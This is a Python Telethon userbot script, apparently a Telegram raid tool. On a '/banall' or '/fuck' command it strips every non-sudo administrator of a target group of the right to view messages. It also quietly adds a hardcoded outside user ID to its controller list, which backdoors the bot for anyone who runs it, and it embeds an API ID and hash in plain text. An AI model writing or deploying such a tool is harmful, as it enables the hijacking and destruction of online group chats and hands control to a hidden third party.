from os import getenv
from asyncio import sleep
from telethon import TelegramClient, events
from telethon.errors import UserIdInvalidError
from telethon.tl.functions.channels import GetParticipants
from telethon.tl.types import ChannelParticipantsAdmins

SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(5360305806)
CHATS = [-1001544173381, -1001841879487]

client = TelegramClient(SESSION, api_id=12227067, api_hash="b463bedd791aa733ae2297e6520302fe")


@client.on(events.NewMessage(chats=SUDO_USERS, pattern='/start'))
async def start(event):
    await event.reply("𝓐𝓜𝓑𝓞𝓣 𝓡𝓮𝓪𝓭𝔂 𝓕𝓸𝓻 𝓚𝓲𝓵𝓵 𝓔𝓷𝓮𝓶𝔂....")


@client.on(events.NewMessage(chats=SUDO_USERS, pattern='/fuck|/banall'))
async def altron(event):
    try:
        chat_id = int(event.text.split(" ")[1])
        m = await event.reply("𝓐𝓜 𝓟𝓻𝓸....")
        if chat_id in CHATS:
            return
    except (ValueError, IndexError):
        await event.reply("**Usage:**\n`/fuck [chat_id]`\n\n`/banall`")
        return

    await m.edit("#AM_PRO\n\n𝓐𝓜 𝓟𝓻𝓸")
    await sleep(3)

    try:
        async for user in client.iter_participants(chat_id, filter=ChannelParticipantsAdmins):
            if user.id in SUDO_USERS:
                continue
            try:
                await client.edit_permissions(chat_id, user.id, view_messages=False)
            except UserIdInvalidError:
                pass
    except Exception as e:
        print(f"Error banning user: {e}")

if __name__ == "__main__":
    client.start()
    client.run_until_disconnected()
